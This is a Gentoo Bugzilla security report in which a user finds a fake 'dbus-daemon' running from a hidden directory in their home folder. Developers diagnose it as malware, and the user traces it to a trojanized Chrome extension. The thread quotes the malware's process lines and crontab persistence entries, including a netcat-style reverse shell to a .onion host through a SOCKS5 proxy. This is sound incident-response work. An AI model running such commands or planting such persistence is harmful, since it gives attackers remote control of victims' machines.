Title: 922072 – sys-apps/dbus-1.15.6 opens lots of connections to foreign hosts
URL: https://bugs.gentoo.org/show_bug.cgi?id=922072

Go to: 
		Gentoo Home
Documentation
Forums
Lists
Bugs
Planet
Store
Wiki
Get Gentoo!





Gentoo's Bugzilla – Bug 922072
sys-apps/dbus-1.15.6 opens lots of connections to foreign hosts
Last modified: 2024-01-14 21:28:51 UTC node [vulture]


Home
| New–[Ex]
| Browse
| Search
| Privacy Policy

| 





[?]
| Reports

| 
Requests

| 
Help


| 
New Account


| 
Log In





[x]



| 
Forgot Password

Login:




[x]













Bug 922072 
      - sys-apps/dbus-1.15.6 opens lots of connections to foreign hosts


Summary:
sys-apps/dbus-1.15.6 opens lots of connections to foreign hosts
    








Status:
    

RESOLVED
          WORKSFORME
      






Alias:


        None
    





Product:

Gentoo Security




Classification:

Unclassified




Component:

Misc

  (show other bugs)



Hardware:

All
        Linux
      







Importance:
      
Normal
       normal
      


Assignee:

Gentoo Security








URL:







Whiteboard:




Keywords:








Depends on:







Blocks:









 





      Reported:
    
2024-01-13 23:36 UTC by Yanestra





      Modified:
    
2024-01-14 21:28 UTC
      (History)
    




          CC List:
        

3 
          users
          
            (show)
          



ajak
ionen
Yanestra









See Also:






Package list:







Runtime testing required:

---























      Attachments
    




Output of lsof (filtered), netstat -a, ps axwww

              (bugreport.zip,9.89 KB,
                application/zip)

            
2024-01-13 23:36 UTC,

            Yanestra




Details





View All

Add an attachment
        (proposed patch, testcase, etc.)
    








Note
              You need to
              log in
              before you can comment on or make changes to this bug.
            

















Description


Yanestra





          2024-01-13 23:36:29 UTC
        

Created attachment 882217 [details]
Output of lsof (filtered), netstat -a, ps axwww

Attention this is security related.

I have observed that at 00:00 local time dbus-daemon which belongs to sys-apps/dbus-1.15.6 started scanning my harddisks and had lots of TCP/IP connections open to
neurostar.ftzplex.com:9001
and
mx161.docmyloan.com:https.

Which makes me really, really nervous. (Actually panicking.)

I re-emerged dbus to check if a someone had it overwritten but this is not the case.




Comment 1


Ionen Wolkens






          2024-01-13 23:47:50 UTC
        

That doesn't seem to be sys-apps/dbus-1.15.6? From your ps output there's a dbus-daemon being ran from your $HOME

 4312 ?        Sl    26:19 /home/kj/.local/share/glib-2.0/schemas/.gschemas/dbus-daemon -f /home/kj/.local/share/glib-2.0/schemas/.gschemas/data

Its pid is 4312 which seems to match with your lsof output.




Comment 2


Sam James









          2024-01-13 23:48:26 UTC
        

Uh..

From your ps output:
 2225 ?        S      0:00 .local/share/glib-2.0/schemas/.gschemas/ps --proxy-type socks5 --proxy 127.0.0.1 9400 bpdcmwuxwha3tpdnlr26oxcygrodqcy57lsmcgqtvtxxjmjgp6shltqd.onion 8269 -e /bin/bash

Also:
```
26223 ?        Ss     0:00 /bin/sh -c /home/kj/.local/share/glib-2.0/schemas/.gschemas/bash > /dev/null 2>&1
26225 ?        S      0:00 /bin/bash /home/kj/.local/share/glib-2.0/schemas/.gschemas/bash
...
```

These are NOT the system dbus-daemon processes. It is one running hidden within your home directory.

Those connections you noticed are to Tor relays too. This looks like it could be malware. I recommend immediately disconnecting from the internet - and ideally powering off the machine so you can analyse it offline, in case it is malware.




Comment 3


Sam James









          2024-01-13 23:58:54 UTC
        

Some questions if you can:
1) How did you notice it in the first place?
2) Please try to preserve the .local/ stuff so it can be analysed.
3) What were you doing around the time it started?
4) Any guesses for how it got on your system?




Comment 4


Yanestra





          2024-01-14 00:05:45 UTC
        

Hmm. The path is probably ~/.local/share/glib-2.0/schemas/.gschemas/dbus-daemon

Funnily enough, I removed the related crontab entries a few hours before without thinking much of it (which obviously that didn't kept that thing from running):

@reboot   /home/kj/.local/share/glib-2.0/schemas/.gschemas/dbus-daemon -f /home/kj/.local/share/glib-2.0/schemas/.gschemas/data > /dev/null 2>&1
1 * * * * /home/kj/.local/share/glib-2.0/schemas/.gschemas/bash > /dev/null 2>&1

Any idea where this might come from? I have no idea and not even a temporal relation. (MTIME=202312050710 CTIME=202312200144, local time each)

@Sam James:

1) I recognized the typical find / ticking noise of my harddisks.
2) ok
3) I tested out LibreWolf from https://codeberg.org/librewolf/gentoo.git
4) (as you can read above) no idea yet. wine-vanilla is an ugly thing but I haven't played in the recent weeks




Comment 5


John Helmert III









          2024-01-14 00:25:57 UTC
        

These are particularly concerning:

 2225 ?        S      0:00 .local/share/glib-2.0/schemas/.gschemas/ps --proxy-type socks5 --proxy 127.0.0.1 9400 bpdcmwuxwha3tpdnlr26oxcygrodqcy57lsmcgqtvtxxjmjgp6shltqd.onion 8269 -e /bin/bash
 4309 ?        Ss     0:00 /bin/sh -c /home/kj/.local/share/glib-2.0/schemas/.gschemas/dbus-daemon -f /home/kj/.local/share/glib-2.0/schemas/.gschemas/data > /dev/null 2>&1
 4312 ?        Sl    26:19 /home/kj/.local/share/glib-2.0/schemas/.gschemas/dbus-daemon -f /home/kj/.local/share/glib-2.0/schemas/.gschemas/data
26223 ?        Ss     0:00 /bin/sh -c /home/kj/.local/share/glib-2.0/schemas/.gschemas/bash > /dev/null 2>&1
26225 ?        S      0:00 /bin/bash /home/kj/.local/share/glib-2.0/schemas/.gschemas/bash

Based on the arguments given to this "ps" command, I unfortunately see a lot of correlation with netcat command line arguments (https://nmap.org/ncat/guide/ncat-proxy.html), which all looks a lot like some kind of shell connection to an onion service. Do the creation times on any of the files in ~/.local/share/glib-2.0 or (or maybe modification times of the cronjobs) offer any indication of when this might've appeared?




Comment 6


Yanestra





          2024-01-14 00:58:20 UTC
        

strings tells me that this executable indeed contains torproject code.

There is a backup of the crontab, but by changing it has been moved and has lost its attributes.

Surprisingly, I don't seem to have left any traces of what I was doing between Dec 20 and Dec 30.

I will check on that, but now it's sleeping time in my timezone.




Comment 7


Yanestra





          2024-01-14 11:32:43 UTC
        

I checked several backups and it appears that I have installed a Google Chrome extension which was trojanized with Trojan.Linux.Fubas.a on December 20 or 21. According to an article in Ars Technica dating September 12, the campaign is inactive. Anyway that makes me scratch my head because the backup of November was definitely clean, meaning that Google still delivers the trojanized extension.




Comment 8


John Helmert III









          2024-01-14 19:29:04 UTC
        

Happy to hear we've gotten this tracked down! I probably wouldn't trust (at a minimum) the executables on the affected system anymore, but you're your admin ;)

Anything more we can do for you here? If OK with you, I think we can close and make this bug public again? I privated it since it appeared this was malware and not Gentoo-related, but I think we can leave its visibility up to you.




Comment 9


Yanestra





          2024-01-14 19:55:03 UTC
        

Thank you very much for your help. It might be a good idea to kick Google's shins, but nothing else left to do.









Format For Printing
 - XML
 - Clone This Bug
 - Clone In The Same 
                        Product
 - Top of page 







Home
| New–[Ex]
| Browse
| Search
| Privacy Policy

| 





[?]
| Reports

| 
Requests

| 
Help


| 
New Account


| 
Log In





[x]



| 
Forgot Password

Login:




[x]

